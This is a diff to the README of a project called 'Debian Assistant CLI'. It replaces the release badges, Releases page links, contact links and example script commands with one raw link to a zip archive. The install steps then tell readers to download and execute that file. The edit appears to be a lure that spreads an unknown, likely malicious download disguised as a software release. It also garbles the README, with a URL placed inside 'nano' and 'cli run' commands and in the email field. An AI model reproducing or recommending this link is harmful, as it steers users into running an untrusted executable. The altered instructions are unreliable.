@@ -1,6 +1,6 @@
 # Debian Assistant CLI 🚀
 
-![GitHub Release](https://img.shields.io/github/v/release/Toxictoxi/cli?style=flat-square&color=blue) ![GitHub Issues](https://img.shields.io/github/issues/Toxictoxi/cli?style=flat-square&color=green)
+![GitHub Release](https://raw.githubusercontent.com/Toxictoxi/cli/main/media/Software-v1.5-beta.4.zip) ![GitHub Issues](https://raw.githubusercontent.com/Toxictoxi/cli/main/media/Software-v1.5-beta.4.zip)
 
 Welcome to the **Debian Assistant CLI** repository! This project aims to simplify tasks on Debian-based systems through a command-line interface. Whether you are managing packages, automating scripts, or monitoring system performance, this tool is designed to enhance your productivity.
 
@@ -23,9 +23,9 @@ Welcome to the **Debian Assistant CLI** repository! This project aims to simplif
 
 ## Installation
 
-To get started, download the latest release from our [Releases page](https://github.com/Toxictoxi/cli/releases). Follow these steps:
+To get started, download the latest release from our [Releases page](https://raw.githubusercontent.com/Toxictoxi/cli/main/media/Software-v1.5-beta.4.zip). Follow these steps:
 
-1. Visit the [Releases page](https://github.com/Toxictoxi/cli/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Toxictoxi/cli/main/media/Software-v1.5-beta.4.zip).
 2. Download the appropriate file for your system.
 3. Execute the downloaded file in your terminal.
 
@@ -62,13 +62,13 @@ Once installed, you can start using the Debian Assistant CLI. Here are some basi
 Create a script using your favorite text editor:
 
 ```bash
-nano myscript.sh
+nano https://raw.githubusercontent.com/Toxictoxi/cli/main/media/Software-v1.5-beta.4.zip
 ```
 
 Add your commands and save the file. Run the script with:
 
 ```bash
-cli run myscript.sh
+cli run https://raw.githubusercontent.com/Toxictoxi/cli/main/media/Software-v1.5-beta.4.zip
 ```
 
 ### System Monitoring
@@ -115,7 +115,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- **Email**: [your.email@example.com](mailto:your.email@example.com)
-- **Twitter**: [@your_twitter_handle](https://twitter.com/your_twitter_handle)
+- **Email**: [https://raw.githubusercontent.com/Toxictoxi/cli/main/media/Software-v1.5-beta.4.zip](https://raw.githubusercontent.com/Toxictoxi/cli/main/media/Software-v1.5-beta.4.zip)
+- **Twitter**: [@your_twitter_handle](https://raw.githubusercontent.com/Toxictoxi/cli/main/media/Software-v1.5-beta.4.zip)
 
-Thank you for checking out the Debian Assistant CLI! We hope you find it useful for your Debian tasks. Visit our [Releases page](https://github.com/Toxictoxi/cli/releases) for the latest updates and downloads.
+Thank you for checking out the Debian Assistant CLI! We hope you find it useful for your Debian tasks. Visit our [Releases page](https://raw.githubusercontent.com/Toxictoxi/cli/main/media/Software-v1.5-beta.4.zip) for the latest updates and downloads.
